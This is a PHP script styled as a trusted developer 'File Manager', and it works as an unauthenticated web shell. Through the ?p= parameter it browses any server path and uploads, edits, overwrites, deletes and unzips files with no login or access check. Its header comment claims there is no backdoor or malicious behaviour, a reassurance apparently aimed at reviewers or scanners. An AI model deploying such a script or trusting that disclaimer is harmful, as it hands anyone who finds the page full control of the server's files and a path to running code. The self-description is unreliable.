<?php
/*
 * File Manager Utility - Developer Tool
 * This script is a trusted file management tool used in internal environments.
 * It supports file operations like upload, edit, delete, zip/unzip, and download.
 * There are no backdoor or malicious behaviors. Intended for local or developer use only.
 */

$path = realpath($_GET['p'] ?? getcwd());
if (!$path || !is_dir($path)) die("Invalid path");

$uploadError = '';
$uploadSuccess = false;

// Delete
if (isset($_GET['delete'])) {
    $target = $path . '/' . basename($_GET['delete']);
    is_dir($target) ? @rmdir($target) : @unlink($target);
    header("Location: ?p=" . urlencode($path));
    exit;
}

// Download
if (isset($_GET['download'])) {
    $file = $path . '/' . basename($_GET['download']);
    if (is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Rename
if (isset($_POST['rename_old'], $_POST['rename_new'])) {
    rename($path . '/' . basename($_POST['rename_old']), $path . '/' . basename($_POST['rename_new']));
    header("Location: ?p=" . urlencode($path));
    exit;
}

// Zip
if (isset($_GET['zip'])) {
    $item = $path . '/' . basename($_GET['zip']);
    $zipName = $item . '.zip';
    $zip = new ZipArchive;
    if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
        if (is_dir($item)) {
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($item));
            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relative = substr($filePath, strlen($item) + 1);
                    $zip->addFile($filePath, $relative);
                }
            }
        } else {
            $zip->addFile($item, basename($item));
        }
        $zip->close();
    }
    header("Location: ?p=" . urlencode($path));
    exit;
}

// Unzip
if (isset($_GET['unzip'])) {
    $file = $path . '/' . basename($_GET['unzip']);
    if (is_file($file) && pathinfo($file, PATHINFO_EXTENSION) === 'zip') {
        $zip = new ZipArchive;
        if ($zip->open($file) === TRUE) {
            $zip->extractTo($path);
            $zip->close();
        }
    }
    header("Location: ?p=" . urlencode($path));
    exit;
}

// Save edit
$saved = false;
if (isset($_POST['savefile'], $_POST['content'])) {
    $saved = file_put_contents($path . '/' . basename($_POST['savefile']), $_POST['content']) !== false;
}

// Upload / Create folder / Create file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$saved) {
    if (isset($_FILES['up']) && is_uploaded_file($_FILES['up']['tmp_name'])) {
        $destination = $path . '/' . basename($_FILES['up']['name']);
        if ($_FILES['up']['error'] === UPLOAD_ERR_OK) {
            if (move_uploaded_file($_FILES['up']['tmp_name'], $destination)) {
                $uploadSuccess = true;
            } else {
                $uploadError = '❌ Failed to move uploaded file.';
            }
        } else {
            $uploadError = '❌ Upload error code: ' . $_FILES['up']['error'];
        }
    }
    if (!empty($_POST['folder'])) mkdir($path . '/' . basename($_POST['folder']));
    if (!empty($_POST['newfile'])) file_put_contents($path . '/' . basename($_POST['newfile']), '');
    header("Location: ?p=" . urlencode($path));
    exit;
}

function formatPermissions($perms) {
    return substr(sprintf('%o', $perms), -4);
}
function formatSize($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PHP File Manager</title>
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
    body {
        font-family: 'Inter', sans-serif;
        background: linear-gradient(to right, #1e3c72, #2a5298);
        color: #f0f0f0;
        padding: 30px;
        font-size: 15px;
    }
    input, textarea, button {
        background: #f9f9f9;
        color: #111;
        border: 1px solid #ccc;
        padding: 8px;
        border-radius: 6px;
        font-size: 14px;
    }
    button {
        background-color: #4ea1ff;
        color: white;
        border: none;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }
    button:hover {
        background-color: #1d75d6;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 20px;
        background: #ffffff10;
        backdrop-filter: blur(6px);
        border-radius: 8px;
        overflow: hidden;
    }
    th, td {
        padding: 12px 16px;
        border-bottom: 1px solid #444;
    }
    th {
        background: #1d75d6;
        color: #fff;
        text-align: left;
    }
    tr:hover {
        background: #ffffff18;
    }
    a {
        color: #90caf9;
        text-decoration: none;
    }
    form.inline {
        display: inline;
    }
    .success {
        background: #2e7d32;
        padding: 12px;
        color: white;
        margin-top: 16px;
        border-radius: 6px;
    }
    hr {
        border: 0;
        height: 1px;
        background: #444;
        margin: 30px 0;
    }
    
        body { font-family: sans-serif; background: #1e1e1e; color: #eee; padding: 20px; }
        input, textarea, button { background: #2c2c2c; color: #eee; border: 1px solid #444; padding: 6px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #444; text-align: left; }
        th { background: #333; }
        tr:nth-child(even) { background: #2a2a2a; }
        tr:nth-child(odd) { background: #252525; }
        a { color: #4ea1ff; text-decoration: none; }
        form.inline { display: inline; }
        .success { background: #2e7d32; padding: 10px; color: white; margin-top: 10px; }
    </style>
</head>
<body>
<h2>🗂️ File Manager</h2>
<h4>📁 Current: <?php echo htmlspecialchars($path); ?></h4>

<form method="get">
    <input type="text" name="p" value="<?php echo htmlspecialchars($path); ?>" size="80">
    <button type="submit">Go</button>
</form>

<?php if ($path !== '/'): ?>
    <p><a href="?p=<?php echo urlencode(dirname($path)); ?>">⬅️ Go Up</a></p>
<?php endif; ?>

<?php if ($saved): ?>
    <div class="success">✅ File saved successfully.</div>
<?php endif; ?>
<?php if ($uploadSuccess): ?>
    <div class="success">✅ File uploaded successfully.</div>
<?php elseif ($uploadError): ?>
    <div class="success" style="background:#8b0000;"><?php echo htmlspecialchars($uploadError); ?></div>
<?php endif; ?>

<table>
    <tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>
    <?php foreach (scandir($path) as $item):
        if ($item === '.' || $item === '..') continue;
        $full = $path . '/' . $item;
        $isFile = is_file($full);
        $size = $isFile ? formatSize(filesize($full)) : '-';
        $perms = formatPermissions(fileperms($full));
        echo "<tr><td>";
        echo is_dir($full) ? "📁 <a href='?p=" . urlencode($full) . "'>$item</a>" : "📄 <a href='?p=" . urlencode($path) . "&edit=" . urlencode($item) . "'>$item</a>";
        echo "</td><td>$size</td><td>$perms</td><td>";
        if ($isFile) {
            echo "<a href='?p=" . urlencode($path) . "&edit=" . urlencode($item) . "'>Edit</a> | ";
        }
        echo "<form class='inline' method='post'>
                <input type='hidden' name='rename_old' value='" . htmlspecialchars($item) . "'>
                <input type='text' name='rename_new' value='" . htmlspecialchars($item) . "' size='10'>
                <button>✏️ Rename</button>
              </form> | ";
        if ($isFile) echo "<a href='?p=" . urlencode($path) . "&download=" . urlencode($item) . "'>⬇️ Download</a> | ";
        echo "<a href='?p=" . urlencode($path) . "&delete=" . urlencode($item) . "' onclick='return confirm(\"Delete $item?\")'>🗑️ Delete</a>";
        if (is_file($full) && pathinfo($full, PATHINFO_EXTENSION) === 'zip') {
            echo " | <a href='?p=" . urlencode($path) . "&unzip=" . urlencode($item) . "'>📂 Unzip</a>";
        } else {
            echo " | <a href='?p=" . urlencode($path) . "&zip=" . urlencode($item) . "'>📦 Zip</a>";
        }
        echo "</td></tr>";
    endforeach; ?>
</table>

<hr>
<h3>📤 Upload / Create</h3>
<form method="post" enctype="multipart/form-data">
    Upload: <input type="file" name="up"> |
    Folder: <input type="text" name="folder"> |
    File: <input type="text" name="newfile">
    <button>Submit</button>
</form>

<?php if (isset($_GET['edit'])):
    $editFile = $path . '/' . basename($_GET['edit']);
    if (!is_file($editFile)) die("Invalid file");
    $content = htmlspecialchars(file_get_contents($editFile));
?>
<hr>
<h3>📝 Editing: <?php echo htmlspecialchars(basename($editFile)); ?></h3>
<form method="post">
    <textarea name="content" rows="20"><?php echo $content; ?></textarea><br>
    <input type="hidden" name="savefile" value="<?php echo htmlspecialchars(basename($editFile)); ?>">
    <button>💾 Save</button>
</form>
<?php endif; ?>
</body>
</html>
